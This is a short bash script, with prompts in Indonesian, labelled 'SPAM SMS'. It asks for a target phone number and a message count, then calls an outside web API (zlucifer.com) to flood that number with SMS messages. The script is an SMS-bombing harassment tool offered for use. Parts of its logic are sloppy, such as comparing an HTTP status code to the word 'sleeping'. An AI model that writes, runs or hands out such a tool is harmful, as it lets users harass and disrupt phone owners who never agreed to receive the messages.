#!/bin/bash
clear
date | lolcat
echo -e "======== SPAM SMS ========"
get_url=$(curl -s http://zlucifer.com/api/sms.php)
cek='curl -s '$get_url # check status
response=`curl -s -o /dev/null -w "%{http_code}" $cek`
if [[ $response = *sleeping* ]]; then

    echo -e 'Website Offline/Restart untuk sementara'
else
    echo -e "[+] Silahkan masukkan nomor target!!"
    read -p "[+] Nomor Target: " target 
    read -p "[+] Masukan jumlah sms : " paket
        echo -e '[+] Mengirim SMS ke nomor ['$target echo -e ']'
           target_do=$get_url'/sms.php?nomor='$target'&paket='$paket
           CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
    fi
